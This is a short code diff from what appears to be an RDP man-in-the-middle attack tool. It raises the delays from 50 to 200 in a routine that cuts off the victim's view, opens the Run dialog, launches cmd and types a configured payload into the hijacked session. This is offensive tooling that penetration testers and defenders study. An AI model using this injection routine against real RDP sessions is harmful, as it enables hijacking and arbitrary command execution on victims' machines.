@@ -339,23 +339,23 @@ class RDPMITM:
         def disableForwarding() -> int:
             self.state.forwardInput = False
             self.state.forwardOutput = False
-            return 50
+            return 200
 
         def openRunWindow() -> int:
             self.attacker.sendKeys([ScanCode.LWIN, ScanCode.KEY_R])
-            return 50
+            return 200
 
         def sendCMD() -> int:
             self.attacker.sendText("cmd")
-            return 50
+            return 200
 
         def sendEnterKey() -> int:
             self.attacker.sendKeys([ScanCode.RETURN])
-            return 50
+            return 200
 
         def sendPayload() -> int:
             self.attacker.sendText(self.config.payload + " & exit")
-            return 50
+            return 200
 
         def waitForPayload() -> int:
             return self.config.payloadDuration
